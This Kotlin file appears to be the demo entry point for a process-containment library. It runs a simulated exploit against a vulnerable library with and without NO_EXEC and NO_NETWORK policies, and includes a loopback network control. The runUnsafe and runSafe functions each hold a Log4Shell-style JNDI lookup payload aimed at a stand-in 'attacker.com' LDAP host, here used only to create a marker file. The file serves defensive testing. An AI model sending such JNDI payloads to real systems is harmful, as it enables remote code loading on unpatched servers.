package demo

import io.mazewall.enforcer.diagnostics.ContainmentViolationDetector
import kotlin.system.exitProcess

fun main(args: Array<String>) {
    val mode = args.getOrNull(0) ?: "all"
    when (mode) {
        "--help", "-h", "help" -> {
            printHelp()
            return
        }
        "unsafe", "safe", "profile", "both", "all" -> Unit
        else -> {
            println("Unknown mode: '$mode'. Run with --help for usage.")
            exitProcess(1)
        }
    }
    val report = runDemo(mode)
    val incomplete = OwnedDemoRuntime.drainRetained()
    println("\n${report.summary()}")
    if (incomplete.isNotEmpty()) {
        System.err.println("Retained runtime owners did not physically drain: $incomplete")
        exitProcess(2)
    }
    if (report.exitCode != 0) exitProcess(report.exitCode)
}

internal fun runDemo(
    mode: String,
    unsafe: () -> ScenarioResult = ::runUnsafe,
    safe: () -> List<ScenarioResult> = { listOf(runSafe(), runNoNetwork()) },
    profile: () -> DemoReport = ::runProfileAndEnforce,
): DemoReport = try {
    when (mode) {
        "unsafe" -> DemoReport(listOf(unsafe()))
        "safe" -> DemoReport(safe())
        "profile" -> profile()
        "all", "both" -> DemoReport(listOf(unsafe()) + safe())
        else -> throw IllegalArgumentException("Unknown demo mode: $mode")
    }
} catch (failure: Exception) {
    rethrowFatalOrRestoreInterruption(failure)
    DemoReport(listOf(ScenarioResult(mode, ExpectedResult.ALLOWED, ScenarioOutcome.InfrastructureFailure(failure))))
}

internal fun runUnsafe(): ScenarioResult = DemoFixture.create("unsafe").use { fixture ->
    println("\u001b[31;1m[STATUS] BEHAVIORAL PROTECTION: INACTIVE\u001b[0m")
    println("Context: A vulnerable library receives a malicious payload.")
    val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"
    observeScenario("unprotected exploit", ExpectedResult.ALLOWED) {
        UnsafeRunner.run(payload)
        check(fixture.marker.exists()) { "exploit returned without creating its marker" }
        "attack created its marker"
    }
}

internal fun runSafe(): ScenarioResult = DemoFixture.create("safe").use { fixture ->
    println("\u001b[32;1m[STATUS] BEHAVIORAL PROTECTION: ACTIVE\u001b[0m")
    println("Contract: \u001b[1mPolicy.NO_EXEC\u001b[0m + \u001b[1mPolicy.NO_NETWORK\u001b[0m")
    val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"
    val observed = observeScenario("protected exploit", ExpectedResult.DENIED) {
        SafeRunner.run(payload)
        "attack returned"
    }
    if (fixture.marker.exists()) observed.copy(outcome = ScenarioOutcome.Completed("attack created its marker")) else observed
}

internal fun classifyContainmentFailure(failure: Throwable): ScenarioOutcome {
    rethrowFatalOrRestoreInterruption(failure)
    val diagnostic = ContainmentViolationDetector.diagnose(failure)
    return if (diagnostic?.evidence == io.mazewall.enforcer.api.ContainmentViolationEvidence.OBSERVED_POLICY_DENIAL) {
        ScenarioOutcome.Denied(diagnostic.evidence.name)
    } else {
        ScenarioOutcome.InfrastructureFailure(failure)
    }
}

internal fun rethrowFatalOrRestoreInterruption(failure: Throwable) {
    var current = failure
    val seen = java.util.Collections.newSetFromMap(java.util.IdentityHashMap<Throwable, Boolean>())
    while (seen.add(current)) {
        when (current) {
            is Error -> throw current
            is InterruptedException -> {
                Thread.currentThread().interrupt()
                return
            }
            is java.util.concurrent.ExecutionException,
            is java.util.concurrent.CompletionException,
            is java.lang.reflect.InvocationTargetException,
            -> current = current.cause ?: return
            else -> return
        }
    }
}

internal fun runNoNetwork(): ScenarioResult {
    val loopback = java.net.InetAddress.getLoopbackAddress()
    return java.net.ServerSocket(0, 1, loopback).use { listener ->
        listener.soTimeout = 2_000
        // Establish that the exact destination is reachable before applying NO_NETWORK.
        java.net.Socket(loopback, listener.localPort).use { listener.accept().close() }
        observeScenario("NO_NETWORK loopback control", ExpectedResult.DENIED) {
            SafeRunner.runContained {
                java.net.Socket().use { socket ->
                    socket.connect(java.net.InetSocketAddress(loopback, listener.localPort), 2_000)
                }
                "network connection escaped"
            }
            "network connection escaped"
        }
    }
}

private fun printHelp() {
    println(
        """
        Usage: DemoApp [mode]

        Modes:
          unsafe   Run the exploit without protection; attack success is expected.
          safe     Run it with NO_EXEC + NO_NETWORK; kernel denial is expected.
          profile  Profile, enforce, and run positive and negative controls.
                   The native file probe is synchronous; io_uring is not exercised.
          all      Run unsafe + safe controls (default); profiling is explicit.
          both     Alias for all.
          --help   Show this message.
        """.trimIndent(),
    )
}
